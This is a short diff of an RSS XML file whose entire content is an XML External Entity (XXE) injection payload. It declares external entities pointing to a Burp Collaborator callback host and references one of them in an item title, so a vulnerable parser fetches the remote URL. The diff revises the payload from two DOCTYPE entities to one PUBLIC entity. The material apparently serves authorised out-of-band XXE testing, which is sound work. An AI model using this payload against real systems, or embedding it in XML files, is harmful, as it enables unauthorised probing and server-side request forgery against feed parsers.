@@ -1,13 +1,12 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE title  [<!ENTITY xxe "http://fat7gdqe00icxroevsr6h9i64xaryg.burpcollaborator.net/xxe"> ]>
-<!DOCTYPE description  [<!ENTITY xxe1 "http://fat7gdqe00icxroevsr6h9i64xaryg.burpcollaborator.net/xxe"> ]>
+<!DOCTYPE title  [<!ENTITY xxe PUBLIC "http://fat7gdqe00icxroevsr6h9i64xaryg.burpcollaborator.net/xxe"> ]>
 <rss version="2.0">
 
 <channel>
 
 <item>
-<title>Item THREE Example &xxe;</title>
-<description>This is an example &xxe1; of an Item Check </description>
+<title>Item SEVEN Example &xxe;</title>
+<description>This is an example of an Item Check </description>
 </item>
 
 
